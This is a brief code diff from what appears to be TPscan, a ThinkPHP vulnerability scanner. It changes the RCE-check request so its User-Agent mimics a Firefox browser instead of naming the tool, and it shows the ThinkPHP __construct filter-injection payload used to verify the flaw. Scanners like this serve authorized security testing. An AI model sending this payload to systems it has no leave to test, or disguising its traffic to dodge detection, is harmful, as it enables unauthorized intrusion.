@@ -16,7 +16,7 @@ def thinkphp_index_construct_rce_verify(url):
         "exception":"",
     }
     headers = {
-        "User-Agent": 'TPscan',
+        "User-Agent": 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:77.0)',
         "Content-Type": "application/x-www-form-urlencoded",
     }
     payload = 's=4e5e5d7364f443e28fbf0d3ae744a59a&_method=__construct&method&filter[]=print_r'
